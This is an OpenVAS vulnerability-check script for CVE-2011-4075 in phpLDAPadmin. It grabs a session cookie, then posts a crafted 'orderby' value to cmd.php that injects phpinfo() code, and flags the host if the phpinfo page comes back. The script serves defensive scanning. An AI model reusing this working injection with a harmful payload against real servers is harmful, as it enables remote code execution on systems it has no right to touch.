###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpldapadmin_50331.nasl 11826 2018-10-10 14:38:27Z cfischer $
#
# phpLDAPadmin 'functions.php' Remote PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103314");
  script_version("$Revision: 11826 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-10 16:38:27 +0200 (Wed, 10 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-10-25 16:57:43 +0200 (Tue, 25 Oct 2011)");
  script_bugtraq_id(50331);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2011-4075");
  script_name("phpLDAPadmin 'functions.php' Remote PHP Code Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("phpldapadmin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpldapadmin/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50331");
  script_xref(name:"URL", value:"http://phpldapadmin.sourceforge.net/");

  script_tag(name:"summary", value:"phpLDAPadmin is prone to a remote PHP code-injection vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary PHP
  code in the context of the affected application. This may facilitate a compromise of the application and
  the underlying system. Other attacks are also possible.");

  script_tag(name:"affected", value:"phpLDAPadmin versions 1.2.0 through 1.2.1.1 are vulnerable.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

CPE = "cpe:/a:phpldapadmin:phpldapadmin";

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

url = string(dir, "/index.php");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if( buf == NULL ) exit(0);

session_id = eregmatch(pattern:"Set-Cookie: ([^;]*);",string:buf);
if(isnull(session_id[1]))exit(0);
sess = session_id[1];

host = http_host_name(port:port);
payload = "cmd=query_engine&query=none&search=1&orderby=foo));}}phpinfo();die;/*";

req = string(
	     "POST ", dir , "/cmd.php HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Cookie: ", sess, "\r\n",
	     "Content-Length: ", strlen(payload),"\r\n",
	     "Content-Type: application/x-www-form-urlencoded\r\n",
	     "Connection: close\r\n",
	     "\r\n",
	     payload
	     );
res = http_send_recv(port:port, data:req);

if("<title>phpinfo()" >< res) {
  security_message(port:port);
  exit(0);
}

exit(99);